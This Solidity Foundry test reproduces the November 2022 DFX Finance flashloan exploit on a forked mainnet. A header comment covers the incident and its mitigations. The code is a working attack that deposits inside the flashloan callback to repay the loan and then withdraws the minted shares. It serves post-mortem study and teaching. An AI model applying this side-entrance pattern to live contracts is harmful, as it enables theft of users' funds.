// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from '../../interfaces/IERC20.sol';
import {IUniswapV3Pair} from '../../utils/IUniswapV3Pair.sol';

// forge test --match-contract Exploit_DFXFinance -vvv
/*
On Nov 10, 2022 an attacker stole more than 6MM USD in various tokens and transactions from DFX Finance.
The attacker requested a flashloan which allowed a backdoor deposit and withdraw. Then, the attacker
reproduced this path several times.

// Attack Overview
Total Lost: ~6MM USD
First Attack Tx: https://etherscan.io/tx/0x390def749b71f516d8bf4329a4cb07bb3568a3627c25e607556621182a17f1f9
Subsequent Attack Tx: https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/ethereum/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7

Exploited Contract: https://etherscan.io/address/0x46161158b1947D9149E066d6d31AF1283b2d377C#code
Attacker Address: https://etherscan.io/address/0x14c19962e4a899f29b3dd9ff52ebfb5e4cb9a067
Attacker Contract: https://etherscan.io/address/0x6cfa86a352339e766ff1ca119c8c40824f41f22d
Attack Block:  15941674

// Key Info Sources
Twitter: https://twitter.com/peckshield/status/1590831589004816384, https://twitter.com/DFXFinance/status/1590858722728972289


Principle: Side Reentrance (Backdoor)

    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external transactable noDelegateCall isNotEmergency {
        ...
        ...
        uint256 balance0After = IERC20(derivatives[0]).balanceOf(address(this));
        uint256 balance1After = IERC20(derivatives[1]).balanceOf(address(this));

        require(balance0Before.add(fee0) <= balance0After, 'Curve/insufficient-token0-returned');
        require(balance1Before.add(fee1) <= balance1After, 'Curve/insufficient-token1-returned');
    }

ATTACK:
Because there is no reentrancy protection in the flashloan function and token balances are checked to determine if the loan was paid back,
the attacker simply asked for a loan and deposited the amount requested to mint shares inside the loan callback. 
Because the balance checked after executing the flashloan callback was satisfied, the loan succeded.
Then, the attacker simply called withdraw and stole the loan amount.

MITIGATIONS:
1) Use reentrancy protection for flashloans
2) Check if the flashloan key variables could be manipuladed by side-entering the contract and if so, its impact.
*/

interface IDFX {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;

    function deposit(uint256 _deposit, uint256 _deadline) external;
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external; 
    function derivatives(uint256) external returns(address);
    function balanceOf(address _of) external returns(uint256);
    function viewDeposit(uint256 _deposit) external view returns(uint256, uint256[] memory);
    function approve(address _spender, uint256 _amount) external returns(bool);
}


contract Exploit_DFXFinance is TestHarness {
    IDFX internal dfx = IDFX(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    IERC20 internal usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 internal xidr = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);

    address internal attackerContract = 0x6cFa86a352339E766FF1cA119c8C40824f41F22D;

    uint256 internal constant AMOUNT_TO_DEPOSIT = 200000000000000000000000;

    // The attacker contract has the possibility to request for foreign flashloans and also to perform the attack with own tokens.
    // The first tx shown above uses a flashloan on Uniswap and then performs the attack with own tokens (to save fees).
    // We are showing an attack once the attacker stole funds several times and starts with pre-existing balance.
    function setUp() external {
        cheat.createSelectFork('mainnet', 15941703); // We pin one block before the exploit happened.

        // We simulate some balance in this contract
        writeTokenBalance(address(this), address(usdc), usdc.balanceOf(attackerContract));
        writeTokenBalance(address(this), address(xidr), xidr.balanceOf(attackerContract));
        cheat.deal(address(this), attackerContract.balance);

        require(xidr.balanceOf(attackerContract) == xidr.balanceOf(address(this)), 'Failed to copy xidr balance');
        require(usdc.balanceOf(attackerContract) == usdc.balanceOf(address(this)), 'Failed to copy usdc balance');

        xidr.approve(address(dfx), type(uint256).max);
        usdc.approve(address(dfx), type(uint256).max);
    }

    function test_attack() external {
        console.log('------- INITIAL BALANCES -------');  
        console.log('DFX');
        logBalances(address(dfx));
        console.log('Attacker');
        logBalances(address(this));

        // Get the amount of USDC required for the attack.
        (uint256 curvesInExchange, uint256[] memory amountPerToken) = dfx.viewDeposit(AMOUNT_TO_DEPOSIT);
        uint256 amount0 = amountPerToken[0] * 994 / 1000; // From tx trace
        uint256 amount1 = amountPerToken[1] * 994 / 1000; // From tx trace

        attack_dfx(amount0, amount1);
    }
    function attack_dfx(uint256 amt0, uint256 amt1) internal {

        requestLoan(amt0, amt1); // We trigger the loan from here.
        
        // Because we do not need to pay it back as we are depositing (rekt) we can later withdraw
        // Burn the shares minted on deposit to claim the tokens back.
        dfx.withdraw(dfx.balanceOf(address(this)), 16666017386600);

        console.log('------- STEP IV: AFTER WITHDRAWING -------');
        console.log('Attacker Balance');
        logBalances(address(this));
        console.log('DFX Balance');
        logBalances(address(dfx));
    }

    function requestLoan(uint256 amt0, uint256 amt1) internal {
        console.log('------- STEP I: FLASHLOAN REQUESTED -------');  
        dfx.flash(address(this), amt0, amt1, new bytes(0));
    }

    function flashCallback(uint256 _fee0, uint256 _fee1, bytes memory data) external {
        require(msg.sender == address(dfx), 'Only callable by DFX');

        console.log('------- STEP II: INSIDE DFX FLASHLOAN CALLBACK -------');  
        console.log('Attacker Balance');
        logBalances(address(this));
        console.log('DFX Balance');
        logBalances(address(dfx));

        dfx.deposit(AMOUNT_TO_DEPOSIT, 16666017386600);
        console.log('------- STEP III: AFTER SIDE ENTRANCE (DEPOSIT) -------');  
        console.log('Attacker Balance');
        logBalances(address(this));
        console.log('DFX Balance');
        logBalances(address(dfx));
    }

    function logBalances(address _from) internal {
        emit log_named_decimal_uint('NATIVE TOKENS', _from.balance, 18);
        emit log_named_decimal_uint('USDC', usdc.balanceOf(_from), 6);
        emit log_named_decimal_uint('XIDR', xidr.balanceOf(_from), 6);

        console.log('\n');
    }
}